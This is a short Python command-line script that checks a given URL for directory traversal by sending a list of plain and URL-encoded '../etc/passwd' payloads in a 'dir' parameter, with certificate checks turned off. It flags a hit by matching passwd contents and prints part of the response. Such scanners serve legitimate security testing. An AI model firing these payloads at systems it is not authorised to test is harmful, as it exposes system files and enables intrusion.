import requests

def check_directory_traversal(url):
    payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
        "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F",
        "..%2F..%2F..%2F..%2F..%2F",
    ]
    
    expected_strings = [
        "root:x:0:0:root:/root:/bin/bash",  # Common content in /etc/passwd
        "Daemon:2:2:Daemon:/sbin:/sbin/nologin"
    ]
    
    vulnerability_found = False

    for payload in payloads:
        test_url = f"{url}?dir={payload}"
        try:
            response = requests.get(test_url, verify=False)  # verify=False to ignore SSL certificate warnings
            response_text = response.text
            is_vulnerable = False
            if response.status_code == 200:
                for expected_string in expected_strings:
                    if expected_string in response_text:
                        is_vulnerable = True
                        break
                if is_vulnerable:
                    vulnerability_found = True
                    print(f"Vulnerable to Directory Traversal: {test_url}")
                    print(f"Response Length: {len(response_text)}")
                    print(f"Response Content (First 500 chars): {response_text[:500]}")
                    break  # Stop checking other payloads once a vulnerability is found
                else:
                    print(f"Not Vulnerable (Expected content not found): {test_url}")
                    print(f"Response Length: {len(response_text)}")
                    print(f"Response Content (First 500 chars): {response_text[:500]}")
            elif response.status_code == 403:
                print(f"Forbidden: {test_url}")
            elif response.status_code == 401:
                print(f"Unauthorized: {test_url}")
            elif response.status_code == 404:
                print(f"Not Found: {test_url}")
            else:
                print(f"Unexpected Status ({response.status_code}): {test_url}")
        except Exception as e:
            print(f"Error checking {test_url}: {str(e)}")
    
    if not vulnerability_found:
        print("No vulnerability found")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 check_directory_traversal.py <url>")
    else:
        url = sys.argv[1]
        check_directory_traversal(url)
